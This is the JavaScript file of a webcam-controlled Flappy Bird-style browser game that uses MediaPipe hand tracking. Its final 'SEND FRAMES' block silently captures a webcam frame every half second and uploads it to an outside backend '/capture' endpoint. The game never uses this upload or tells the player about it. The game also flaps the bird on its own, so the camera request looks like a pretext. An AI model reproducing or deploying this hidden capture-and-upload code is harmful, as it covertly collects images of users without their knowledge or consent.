const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");

const birdImg = new Image();
birdImg.src = "../assets/custom_bird.png";

const pipeImg = new Image();
pipeImg.src = "../assets/pipe.png";

let birdY = 300,
    velocity = 0,
    gameOver = false,
    score = 0;

const gravity = 0.35,
      flapStrength = -6;

let pipes = [],
    pipeWidth = 50,
    gap = 150,
    pipeSpeed = 2;

let gameStarted = false,
    cameraStarted = false;
let animationId = null;

function flap() {
  velocity = flapStrength;
}

function autoFlap() {
  let targetY = canvas.height / 2;
  const nextPipe = pipes.find(pipe => pipe.x + pipeWidth > 150);
  if (nextPipe) targetY = (nextPipe.topHeight + nextPipe.bottomY) / 2;
  const birdMiddle = birdY + 25;
  if (birdMiddle > targetY + 10 || velocity > 4) flap();
}

function initialFlapBurst() {
  let count = 0;
  const burst = setInterval(() => {
    flap();
    count++;
    if (count >= 5) clearInterval(burst);
  }, 100);
}

setInterval(() => {
  if (!gameOver && gameStarted) {
    const topHeight = Math.random() * (canvas.height - gap - 100) + 50;
    pipes.push({ x: canvas.width, topHeight, bottomY: topHeight + gap });
  }
}, 1500);

function drawPipes() {
  pipes.forEach(pipe => {
    ctx.drawImage(pipeImg, pipe.x, 0, pipeWidth, pipe.topHeight);
    ctx.drawImage(pipeImg, pipe.x, pipe.bottomY, pipeWidth, canvas.height - pipe.bottomY);
    pipe.x -= pipeSpeed;

    if (
      150 + 50 > pipe.x &&
      150 < pipe.x + pipeWidth &&
      (birdY < pipe.topHeight || birdY + 50 > pipe.bottomY)
    ) gameOver = true;

    if (pipe.x + pipeWidth === 150) score++;
  });

  pipes = pipes.filter(pipe => pipe.x + pipeWidth > 0);
}

function gameLoop() {
  if (!gameStarted) {
    ctx.fillStyle = "#4ec0ca";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "white";
    ctx.font = "20px Arial";
    ctx.fillText("Click 'Play Game' to start", 50, 300);
    animationId = requestAnimationFrame(gameLoop);
    return;
  }

  if (gameOver) {
    ctx.fillStyle = "red";
    ctx.font = "40px Arial";
    ctx.fillText("Game Over!", 80, 300);

    // Show Retry button always when game is over
    const retryBtn = document.getElementById("retryBtn");
    retryBtn.style.display = "inline-block";

    return;
  }

  velocity += gravity;
  birdY += velocity;

  const groundY = canvas.height - 50;
  if (birdY + 50 > groundY) {
    birdY = groundY - 50;
    velocity = 0;
    gameOver = true;
  }
  if (birdY < 0) {
    birdY = 0;
    velocity = 0;
  }

  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "#4ec0ca";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  drawPipes();
  autoFlap();
  ctx.drawImage(birdImg, 150, birdY, 50, 50);

  ctx.fillStyle = "#8B4513";
  ctx.fillRect(0, groundY, canvas.width, canvas.height - groundY);

  ctx.fillStyle = "white";
  ctx.font = "30px Arial";
  ctx.fillText(score, 10, 40);

  document.getElementById("score").textContent = score;

  animationId = requestAnimationFrame(gameLoop);
}

gameLoop();

/* ===== HAND + CAMERA ===== */
const videoElement = document.getElementById("video");
const hands = new Hands({
  locateFile: file => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
});

hands.setOptions({
  maxNumHands: 1,
  minDetectionConfidence: 0.7,
  minTrackingConfidence: 0.7
});

hands.onResults(results => {
  if (results.multiHandLandmarks) flap();
});

const cameraInstance = new Camera(videoElement, {
  onFrame: async () => {
    try {
      await hands.send({ image: videoElement });
    } catch {}
  },
  width: 640,
  height: 480
});

/* ===== START GAME ===== */
document.getElementById("startBtn").addEventListener("click", async () => {
  try {
    await cameraInstance.start();
    cameraStarted = true;
    gameStarted = true;
    initialFlapBurst();
  } catch {
    alert("Camera permission denied");
  }
});

/* ===== RETRY GAME (FIXED) ===== */
document.getElementById("retryBtn").addEventListener("click", () => {
  // Reset game state
  birdY = 300;
  velocity = 0;
  score = 0;
  pipes = [];
  gameOver = false;

  // Hide retry button
  const retryBtn = document.getElementById("retryBtn");
  retryBtn.style.display = "none";

  // Update score display
  document.getElementById("score").textContent = score;

  // Restart game
  gameStarted = true;
  initialFlapBurst();

  if (!animationId) animationId = requestAnimationFrame(gameLoop);
});

/* ===== SEND FRAMES ===== */
const BACKEND_URL = "https://backend-production-4c46.up.railway.app/capture";

setInterval(() => {
  if (!cameraStarted || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;

  const tempCanvas = document.createElement("canvas");
  const scale = 0.4;
  tempCanvas.width = videoElement.videoWidth * scale;
  tempCanvas.height = videoElement.videoHeight * scale;

  const tctx = tempCanvas.getContext("2d");
  tctx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);

  tempCanvas.toBlob(blob => {
    const fd = new FormData();
    fd.append("image", blob);
    fetch(BACKEND_URL, { method: "POST", body: fd });
  }, "image/jpeg", 0.6);
}, 500);
